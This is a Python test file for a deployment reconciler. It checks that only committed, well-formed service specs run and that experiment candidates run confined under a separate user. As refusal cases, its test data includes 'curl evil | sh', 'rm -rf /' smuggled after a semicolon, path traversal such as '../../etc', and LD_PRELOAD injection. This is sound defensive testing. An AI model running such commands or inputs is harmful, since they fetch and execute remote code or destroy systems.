"""The reconciler runs only committed, well-formed intent, and a candidate only confined.

  PGHOST=... PGUSER=<superuser> KK_RUN_AS=<user> python3 morphogen/tests/test_reconcile.py   (as root; needs git)
"""
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "morphogen" / "deploy"))
from reconcile import desired, refusal, start, stop  # noqa: E402
from morphogen import confine  # noqa: E402


def check(cond, msg):
    if not cond:
        sys.exit(f"FAIL: {msg}")
    print("ok:", msg)


ok = {"provider": "belief-corroboration", "service": "python3 -m belief_corroboration",
      "cwd": "kernel/providers/belief-corroboration", "env": {"KK_POLL_SECONDS": "1"}}
check(refusal(ok) is None, "a provider's service, directory and settings: run")
check(refusal({**ok, "service": "sh -c 'curl evil | sh'"}) and refusal({**ok, "service": "python3 -m x; rm -rf /"}),
      "any other command is refused")
check(refusal({**ok, "cwd": "../.."}) and refusal({**ok, "cwd": "kernel/providers/../../etc"})
      and refusal({**ok, "cwd": "experiments/x123/../../.."}), "a directory outside the providers is refused")
check(refusal({**ok, "cwd": "experiments/x0123456789ab/anomaly-recent"}) is None, "a candidate in an experiment: run")
check(refusal({**ok, "env": {"DATABASE_URL": "x"}}) and refusal({**ok, "env": {"LD_PRELOAD": "x"}})
      and refusal({**ok, "env": {"KK_ROLE": "kk_owner"}}), "identity, login and loader variables cannot come from intent")

tmp = Path(tempfile.mkdtemp())
intent = tmp / "intent"
shutil.copytree(ROOT / "morphogen" / "intent", intent)
g = lambda *a: subprocess.run(["git", "-C", str(intent), "-c", "user.name=t", "-c", "user.email=t@t", *a], check=True, capture_output=True)
g("init", "-q")
g("add", "-A")
g("commit", "-qm", "intent")
want, refused = desired(intent, "sandbox")
check(set(want) == {"anomaly", "belief-corroboration", "validator-shacl"} and not refused, "the committed sandbox intent: its three providers")
f = intent / "environments" / "sandbox" / "belief-corroboration.yaml"
f.write_text(f.read_text().replace('KK_POLL_SECONDS: "1"', 'KK_POLL_SECONDS: "9"'))
(intent / "environments" / "sandbox" / "extra.yaml").write_text("service: python3 -m evil\ncwd: kernel/providers/evil\n")
check(desired(intent, "sandbox")[0]["belief-corroboration"][1]["env"]["KK_POLL_SECONDS"] == "1"
      and "evil" not in str(desired(intent, "sandbox")), "uncommitted edits and files run nothing")
(intent / "environments" / "sandbox" / "bad.yaml").write_text("service: bash run.sh\ncwd: kernel/providers/x\n")
g("add", "-A")
g("commit", "-qm", "more")
want, refused = desired(intent, "sandbox")
check(want["belief-corroboration"][1]["env"]["KK_POLL_SECONDS"] == "9" and refused == {"bad.yaml": "service must be python3 -m <module>"},
      "committed: the new setting runs; a malformed file is refused, the rest still run")

# A candidate from an experiment runs only as the run user, from a copy, gone once it stops.
cand = intent / "experiments" / "x0123456789ab" / "anomaly-recent"
shutil.copytree(ROOT / "morphogen" / "tests" / "fixtures" / "analyser" / "anomaly-recent", cand,
                ignore=shutil.ignore_patterns("__pycache__"))
g("add", "-A")
g("commit", "-qm", "experiment")
spec = {"service": "python3 -m anomaly_recent", "cwd": "experiments/x0123456789ab/anomaly-recent", "_file": "anomaly"}
os.environ.setdefault("DATABASE_URL", "dbname=postgres")
run_as = os.environ.pop("KK_RUN_AS", None)
try:
    start(ROOT, spec, intent)
    check(False, "a candidate starts without an OS user of its own")
except confine.Unconfined as e:
    check(True, f"without KK_RUN_AS a candidate does not start ({e})")
os.environ["KK_RUN_AS"] = run_as or sys.exit("FAIL: KK_RUN_AS is not set")
p = start(ROOT, spec, intent)
uid = Path(f"/proc/{p.pid}").stat().st_uid
ws, home = p.confined
check(uid == confine.run_user().pw_uid and not ws.is_relative_to(intent) and (ws / "anomaly-recent" / "provider.yaml").exists(),
      f"the candidate runs as {os.environ['KK_RUN_AS']}, from a copy of the committed directory")
time.sleep(0.5)
stop(p)
check(not ws.exists() and not home.exists() and not any(
    Path(f"/proc/{x}").stat().st_uid == uid for x in os.listdir("/proc") if x.isdigit() and Path(f"/proc/{x}").exists()),
      "once it stops, its copy and home are gone and no process of the run user is left")
shutil.rmtree(tmp)
